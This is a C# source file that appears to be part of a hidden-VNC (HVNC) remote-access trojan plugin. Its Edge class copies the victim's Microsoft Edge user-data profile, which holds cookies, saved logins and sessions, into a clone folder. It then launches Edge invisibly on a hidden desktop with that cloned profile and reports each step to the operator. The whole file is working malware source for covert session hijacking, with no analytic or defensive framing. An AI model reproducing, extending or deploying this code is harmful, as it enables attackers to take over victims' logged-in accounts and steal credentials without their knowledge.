#define DEBUG
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using DLL.S.OpenApp;
using HVNC;
using Microsoft.VisualBasic.Devices;

namespace S.OpenApp;

internal class Edge
{
	private static readonly Computer PC = new Computer();

	private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data";

	private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\Edge Data";

	private static readonly string FilenameEdge = WDir.SystemDirectory + "Program Files\\Microsoft\\Edge\\Application\\msedge.exe";

	private static readonly string FilenameEdgeX86 = WDir.SystemDirectory + "Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";

	public static void OpenEdgeBrowser()
	{
		HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
		try
		{
			if (!File.Exists(FilenameEdge) && !File.Exists(FilenameEdgeX86))
			{
				HVNC.Plugin.Helper.SendMSG("MicrosoftEdge: Not Installed!");
				return;
			}
			try
			{
				if (!Directory.Exists(fileNameUserDataCopy))
				{
					HVNC.Plugin.Helper.SendMSG("MicrosoftEdge: CloneProfile..");
					PC.FileSystem.CopyDirectory(fileNameUserData, fileNameUserDataCopy);
					HVNC.Plugin.Helper.SendMSG("MicrosoftEdge: CloneProfile Completed");
				}
			}
			catch
			{
				Debug.WriteLine("Error!");
			}
			Debug.WriteLine("Complete.///");
			new Thread((ThreadStart)delegate
			{
				Thread.Sleep(1000);
				HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
				Open();
			}).Start();
		}
		catch (Exception ex)
		{
			HVNC.Plugin.Helper.SendMSG("MicrosoftEdge: " + ex.Message);
		}
	}

	public static void Open()
	{
		try
		{
			string text = null;
			if (File.Exists(FilenameEdge))
			{
				text = FilenameEdge;
			}
			if (File.Exists(FilenameEdgeX86))
			{
				text = FilenameEdgeX86;
			}
			if (text != null)
			{
				HideDesktop.CreateProcess("\"" + text + "\" --disable-3d-apis --disable-gpu --disable-d3d11 \"--user-data-dir=" + fileNameUserDataCopy + "\"", HVNC.Plugin.Helper.NameDesktop, bAppName: false);
				Debug.WriteLine("Running.////");
				HVNC.Plugin.Helper.SendMSG("MicrosoftEdge: Running");
				Thread.Sleep(3000);
				HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
				Debug.WriteLine("Refresh");
			}
		}
		catch (Exception ex)
		{
			HVNC.Plugin.Helper.SendMSG("MicrosoftEdge: " + ex.Message);
		}
	}
}
